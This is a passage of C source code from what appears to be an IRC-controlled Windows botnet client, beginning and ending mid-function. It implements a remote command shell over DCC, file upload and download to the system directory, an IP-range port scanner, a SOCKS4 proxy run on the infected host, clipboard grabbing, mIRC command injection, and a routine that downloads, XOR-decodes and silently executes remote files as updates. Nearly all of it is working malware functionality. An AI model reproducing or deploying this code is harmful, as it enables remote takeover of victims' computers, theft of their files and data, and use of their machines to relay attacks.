	if (in.s_addr == INADDR_NONE)
		Hostent = fgethostbyname(host); //hostname
	if (Hostent == NULL && in.s_addr == INADDR_NONE)  //error dns
		return INVALID_SOCKET;
	if (Hostent != NULL)
		ssin.sin_addr = *((LPIN_ADDR)*Hostent->h_addr_list); //hostname
	else
		ssin.sin_addr = in; //ip address

	if (fconnect(ssock, (LPSOCKADDR) &ssin, sizeof(ssin)) == SOCKET_ERROR) {
		fclosesocket(ssock);
		return INVALID_SOCKET;
	}

	return (ssock);
}

DWORD WINAPI DCCChatThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char buffer[4096];

	SOCKET ssock;
	if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) { 
		sprintf(buffer,"8::[4DcC8]:: Failed to open socket.");
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	if (open_cmd(ssock,"") == -1) {
		sprintf(buffer,"8::[4DcC8]:: Failed to open remote command shell.");
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		fclosesocket(ssock);
		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	Sleep(100);

	while (1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(ssock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		strcat(buffer,"\n");
		if (!send_commands(buffer))
			break;

		Sleep(100);
		if (findthreadid(RCMD_THREAD) == 0)
			break;
	}
	sprintf(buffer,"8::[4DcC8]:: Failed to send to Remote command shell.");
	if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
	addlog(buffer);
	
	fclosesocket(ssock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}


DWORD WINAPI DCCSendThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[1024],tmpfile[MAX_PATH];

	int Fsend, bytes_sent;
	unsigned int move;
	unsigned __int64 totalbytes = 0;

	DWORD mode = 0;

	SOCKET ssock;
	while (1) {
		if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      		sprintf(sendbuf,"8::[4DcC8]:: Failed to create socket.");
			break;
		}

		SOCKADDR_IN csin, ssin;
		memset(&ssin, 0, sizeof(ssin));
   		ssin.sin_family = AF_INET;
   		ssin.sin_port = fhtons(0);//random port
		ssin.sin_addr.s_addr = INADDR_ANY;
		
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != 0) {
			sprintf(sendbuf,"8::[4DcC8]:: Failed to bind to socket.");
			break;
		}
		int ssin_len = sizeof(ssin);
		fgetsockname(ssock, (LPSOCKADDR)&ssin, &ssin_len);

		unsigned short portnum = fntohs(ssin.sin_port);
		for (unsigned int i=0;i <= strlen(dcc.filename); i++)
			tmpfile[i] = ((dcc.filename[i] == 32)?(95):(dcc.filename[i]));

		if (flisten(ssock, 1) != 0) {
			sprintf(sendbuf,"8::[4DcC8]:: Failed to open socket.");
			break;
		}
		HANDLE testfile = CreateFile(dcc.filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"8::[4DcC8]:: File doesn't exist.");
			break;
		}

		int length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,".DCC SEND %s %i %i %i.",dcc.filename,fhtonl(finet_addr(GetIP(dcc.sock))),portnum,length);
		irc_privmsg(dcc.sock,dcc.sendto,sendbuf,FALSE);

		TIMEVAL timeout;
    	timeout.tv_sec = 60;//timeout after 60 sec.
    	timeout.tv_usec = 0;
		fd_set fd_struct;
		FD_ZERO(&fd_struct);
    	FD_SET(ssock, &fd_struct);

		if (fselect(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
			irc_privmsg(dcc.sock,dcc.sendto,"8::[4DcC8]:: Send timeout.",dcc.notice);
			break;
		}
		int csin_len = sizeof(csin);
		if ((dcc.csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)  {
			sprintf(sendbuf,"8::[4DcC8]:: Unable to open socket.");
			break;
		} 
		fclosesocket(ssock);

		while (length) {
			Fsend = 1024;
			if (Fsend>length) 
				Fsend=length;
			move = 0-length;

			memset(buffer,0,sizeof(buffer));
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);

			bytes_sent = fsend(dcc.csock, buffer, Fsend, 0);
			totalbytes += bytes_sent;

			if (frecv(dcc.csock,buffer ,sizeof(buffer), 0) < 1 || bytes_sent < 1) {
				irc_privmsg(dcc.sock,dcc.sendto,"8::[4DcC8]:: Socket error.",dcc.notice);
				addlog("8::[4DcC8]:: Socket error.");

				fclosesocket(dcc.csock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE) 
			CloseHandle(testfile);
		sprintf(sendbuf,"8::[4DcC8]:: Transfer complete to IP: %s, Filename: %s (%s bytes).",finet_ntoa(csin.sin_addr),dcc.filename,commaI64(totalbytes));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (ssock > 0)
		fclosesocket(ssock);
	fclosesocket(dcc.csock);
	clearthread(dcc.threadnum);

	ExitThread(0);
}

DWORD WINAPI DCCGetThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[4096],tmpfile[MAX_PATH];;

	int received = 0;
	unsigned long received2;

	FILE *infile;
	
	SOCKET ssock;

	GetSystemDirectory(tmpfile, sizeof(tmpfile));
	sprintf(tmpfile,"%s%s",tmpfile,dcc.filename);

	while (1) {
		HANDLE testfile = CreateFile(tmpfile,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"8::[4DcC8]:: Error unable to write file to disk.");
			break;
		}
		CloseHandle(testfile);

		if ((infile = fopen(tmpfile,"a+b")) == NULL) {
			sprintf(sendbuf,"8::[4DcC8]:: Error opening file for writing.");
			break;
		}
	
		if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) {
			sprintf(sendbuf,"8::[4DcC8]:: Error opening socket.");
			break;
		}
		DWORD err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));

			err = frecv(ssock, buffer, sizeof(buffer), 0);
			if (err == 0) 
				break;
			if (err == SOCKET_ERROR) {
				sprintf(sendbuf,"8::[4DcC8]:: Socket error.");
				irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
				addlog(sendbuf);

				fclose(infile);
				fclosesocket(ssock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
	
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  fhtonl(received);
			fsend(ssock,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuf,"8::[4DcC8]:: Transfer complete from IP: %s, Filename: %s (%s bytes).",dcc.host,dcc.filename,commaI64(received));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (infile != NULL) 
		fclose(infile);
	if (ssock > 0) 
		fclosesocket(ssock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}
#endif

// globals
#ifdef DEBUG_LOGGING
FILE *gfp;
#endif

char log[LOGSIZE][LOGLINE];

int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "1-::[4AlIaS lIsT8]::-", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--) 
		if (log[i][0] != '\0') 
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void addlogv(char *desc, ...)
{
	char logbuf[LOGLINE];

	va_list argp;
	va_start(argp, desc); 
	_vsnprintf(logbuf, sizeof(logbuf), desc, argp);

	addlog(logbuf);
	
	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}
	
	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "8::[4LoGs8]:: Cleared.", notice);
	addlog("[LOGS]: Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++) 
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}
	
	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param) 
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"8::[4LoG8]:: Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}
	
	sprintf(sendbuf,"8::[4LoG8]:: List complete.");
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif

#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType) {
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		return TRUE;
	}
 
	return FALSE;
}

void OpenConsole(void)
{
	AllocConsole();
 
	int hCrt = _open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE),_O_TEXT);
	FILE *hf = _fdopen(hCrt,"w");
	*stdout = *hf;
	int i = setvbuf(stdout,NULL,_IONBF,0); 

	hCrt = _open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE),_O_TEXT);
	hf = _fdopen(hCrt,"w");
	*stderr = *hf;
	i = setvbuf(stdout,NULL,_IONBF,0); 
 
	SetConsoleCtrlHandler(HandlerRoutine, true);

	return;
}
#endif
	
#ifndef NO_SCAN

            // checks ip for open port
DWORD WINAPI ScanConnectThread(LPVOID param)
{
	static char sendbuf[IRCLINE];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->cgotinfo = TRUE;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)scan.port);
	ssin.sin_addr = scan.addy;

	SOCKET sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock != INVALID_SOCKET) {
		DWORD err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		threads[scan.threadnum].sock = sock;
		if (err != SOCKET_ERROR) {
			sprintf(sendbuf,"8::[4ScAn8]:: IP: %s Port: %d is open.", finet_ntoa(scan.addy), scan.port);
			irc_privmsg(scan.sock, scan.chan, sendbuf, scan.notice);
			addlog(sendbuf);
		}
	} 
	fclosesocket(sock);

	return 0;
}

// scan a range of IPs for an open port
DWORD WINAPI ScanThread(LPVOID param)
{
	DWORD id, host;
	HANDLE th;
	char str[128];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->gotinfo = TRUE;

	while(1) {
		sprintf(str, "8::[4ScAn8]:: Scanning IP: %s, Port: %d.", finet_ntoa(scan.addy), scan.port);
		strncpy(threads[scan.threadnum].name, str, sizeof(threads[scan.threadnum].name)-1);
		if (th = CreateThread(NULL, 0, &ScanConnectThread, (LPVOID)&scan, 0, &id)) {
			while(scan.cgotinfo == FALSE)
				Sleep(50);
		}
		CloseHandle(th);
		scans->cgotinfo = FALSE;
		Sleep(scans->delay);
		memcpy(&host, &scan.addy, 4);
		host = fntohl(host);
		host += 1;
		host = fhtonl(host);
		memcpy(&scan.addy, &host, 4);
	}
	clearthread(scan.threadnum);

	return 0;
 }
#endif

#ifndef NO_SOCK4SERV

DWORD WINAPI Socks4Thread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SOCKADDR_IN ssin, csin;
	SOCKET ssock, csock;
	DWORD lpThreadId;

	int csin_len = sizeof(csin);

	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	socks4p->gotinfo = TRUE;

	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)socks4.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	threads[socks4.threadnum].sock=ssock;

	if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == 0) {	
		if (flisten(ssock, 10) == 0) {
			sprintf(sendbuf, "8::[4SoCkS48]:: Server started on: %s:%d.", GetIP(socks4.sock), socks4.port);
			if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
			addlog(sendbuf);
			
			while (1) {
				csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len);
				socks4.cgotinfo = FALSE;
				sprintf(sendbuf,"8::[4SoCkS48]:: Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, socks4.threadnum);
				socks4.cthreadnum = addthread(sendbuf,SOCKS4_THREAD,csock);
				threads[socks4.cthreadnum].parent = socks4.threadnum;
				if (threads[socks4.cthreadnum].tHandle = CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)&socks4, 0, &lpThreadId)) {
					while (socks4.cgotinfo == FALSE) 
						Sleep(5);
				} else
					sprintf(sendbuf, "8::[4SoCkS48]:: Failed to start client thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
			}
		}
	}
	fclosesocket(ssock);

	sprintf(sendbuf, "8::[4SoCkS48]:: Failed to start server on Port %d.", socks4.port);
	if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
	addlog(sendbuf);

	clearthread(socks4.threadnum);

	ExitThread(0);
}

DWORD WINAPI Socks4ClientThread(LPVOID param)
{
	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	socks4p->cgotinfo = TRUE;

	int threadnum = socks4.cthreadnum;

	SOCKS4HEADER hdr;

	TIMEVAL timeout;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	fd_set fd;
	FD_ZERO(&fd);
	FD_SET(threads[threadnum].sock, &fd);

	if (fselect(0, &fd, NULL, NULL, &timeout) == 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}
	if (frecv(threads[threadnum].sock, (char *)&hdr, sizeof(hdr), 0) <= 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);		
		ExitThread(0);
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	// FIX ME: do a userid (hdr.userid) check here if you wish to use simple auth (needs testing)
	if (socks4.userid[0] != '\0') {
		if (strcmp(hdr.userid, socks4.userid) != 0) {
			addlogv("8::[4SoCkS48]:: Authentication failed. Remote userid: %s != %s.", hdr.userid, socks4.userid);
	
			hdr.vn = 0;
			hdr.cd = SOCKS4_REJECT_USERID;
			memset(&hdr.userid, 0, 1024);
			fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

			fclosesocket(threads[threadnum].sock);
			clearthread(threadnum);

			ExitThread(0);
		}
	}

	SOCKADDR_IN tsin;
	memset(&tsin, 0, sizeof(tsin));
	tsin.sin_family = AF_INET;
	tsin.sin_port = hdr.destport;
	tsin.sin_addr.s_addr = hdr.destaddr;

	SOCKET tsock;
	if ((tsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		addlogv("8::[4SoCkS48]:: Error: Failed to open socket(), returned: <%d>.", fWSAGetLastError());

		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
	
		ExitThread(0);
	}

	if (fconnect(tsock, (LPSOCKADDR)&tsin, sizeof(tsin)) == SOCKET_ERROR) {
		addlogv("8::[4SoCkS48]:: Error: Failed to connect to target, returned: <%d>.", fWSAGetLastError());

		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);

		ExitThread(0);
	}

	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);
	TransferLoop(tsock, threads[threadnum].sock);

	fclosesocket(tsock);
	fclosesocket(threads[threadnum].sock);
	clearthread(threadnum);

	ExitThread(0);
}
	
void TransferLoop(SOCKET tsock, SOCKET csock)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE) {
		FD_ZERO(&fd);
		FD_SET(csock, &fd);
		FD_SET(tsock, &fd);

		memset(buf, 0, sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);

		if(fFD_ISSET(csock, &fd)) {
			if((len = frecv(csock,buf,sizeof(buf),0))== -1) break;
			if(fsend(tsock,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(tsock,&fd)) {
			if((len = frecv(tsock,buf,sizeof(buf),0))== -1) break;
			if(fsend(csock,buf,len,0)== -1) break;
		}
	}

	return;
}
#endif

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"8::[4DoWnLoAd8]:: Couldn't open file: %s.",dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			addlog(buffer);

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) 
				sprintf(threads[dl.threadnum].name, "8::[4DoWnLoAd8]:: File download: %s (%dKB transferred).", dl.url, total / 1024);
			else 
				sprintf(threads[dl.threadnum].name, "8::[4DoWnLoAd8]:: Update: %s (%dKB transferred).", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"8::[4DoWnLoAd8]:: Filesize is incorrect: (%d != %d).", total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				addlog(buffer);
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		/* if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(buffer,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC Failed!",dl.notice);
			}
			
		} */
		free(fileTotBuff);
		
		if (dl.expectedcrc) { 
			unsigned long crc=crc32f(dl.dest); 
			if (crc!=dl.expectedcrc) { 
				goodfile=FALSE;
				sprintf(buffer,"8::[4DoWnLoAd8]:: CRC Failed (%d != %d).", crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice); 
				addlog(buffer);
			} 
		} 

		if (goodfile==FALSE) 
			goto badfile;
		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "8::[4DoWnLoAd8]:: Downloaded %.1f KB to %s @ %.1f KB/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"8::[4DoWnLoAd8]:: Opened: %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
					addlog(buffer);
				}
			}

		// download is an update
		} else {
			sprintf(buffer, "8::[4DoWnLoAd8]:: Downloaded %.1fKB to %s @ %.1fKB/sec. Updating.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"8::[4DoWnLoAd8]:: Update failed: Error executing file: %s.",dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}
	} else {
		sprintf(buffer,"8::[4DoWnLoAd8]:: Bad URL, or DNS Error: %s.",dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		addlog(buffer);
	}

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif

// globals
extern char tempdir[256];      // name of temp folder

/* search-and-replace function for strings
char *replacestr(char *str, char *oldstr, char *newstr)
{
	char *p, str2[512], str3[512], str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) 
			if (strlen(p+1) > strlen(oldstr-1)) 
				sprintf(str2, "%s%s%s", str3, newstr, str4);
			else 
				sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);

	return str;
}
*/

char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++) 
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) 
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES) 
				lines[index++] = &inStr[i+1]; 
			else 
				break;
		}
	}

	if (saveArray!=0) 
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}

void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0; 
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void) 
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData) 
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
